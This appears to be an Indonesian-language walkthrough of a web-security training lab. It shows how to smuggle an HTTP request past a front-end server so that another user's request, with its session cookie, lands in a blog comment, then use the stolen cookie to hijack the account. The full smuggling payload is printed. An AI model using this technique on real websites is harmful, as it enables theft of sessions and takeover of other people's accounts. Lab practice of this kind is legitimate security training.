# Exploiting HTTP request smuggling to capture other users' requests

Praktikum ini melibatkan server front-end dan back-end, dan server front-end tidak mendukung pengkodean chunked.

Untuk menyelesaikan lab ini, selundupkan permintaan ke server back-end yang menyebabkan permintaan pengguna berikutnya tersimpan di dalam aplikasi. Kemudian ambil permintaan pengguna berikutnya dan gunakan cookie pengguna korban untuk mengakses akun mereka. 

## Petunjuk

Jika Anda mengalami batas waktu (timeout), ini mungkin menunjukkan bahwa jumlah byte yang Anda coba tangkap lebih besar daripada jumlah total byte dalam permintaan berikutnya. Cobalah untuk mengurangi jumlah byte tersebut. `Content-Length` ditentukan dalam awalan permintaan penyelundupan. 

## 1

Kunjungi sebuah postingan blog dan tinggalkan komentar.
Kirim `comment-post` Request ke Burp Repeater, acak parameter body sehingga `comment` Parameter tersebut muncul terakhir, dan pastikan masih berfungsi.

Tingkatkan `comment-post` request `Content-Length` ke 400, lalu selundupkan ke server back-end: 

```bash
POST / HTTP/2
Host: 0a13004b035a823880af035800560074.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 275
Transfer-Encoding: chunked

0

POST /post/comment HTTP/2
Host: 0a13004b035a823880af035800560074.web-security-academy.net
Cookie: session=H0ke8tQrKULerkBr21KQu82k7MeOn4VN


csrf=Pyikwkntps99aByY97bQnGvhbUORq01Y&postId=1&comment=testing&name=testes&email=tes%40tes.com&website=https%3A%2F%2Ftes.com
```

Lihat postingan blog untuk memeriksa apakah ada komentar yang berisi permintaan pengguna. Perhatikan bahwa pengguna target hanya mengunjungi situs web sesekali, jadi Anda mungkin perlu mengulangi serangan ini beberapa kali sebelum berhasil.

Salin header Cookie pengguna dari komentar, dan gunakan untuk mengakses akun mereka.
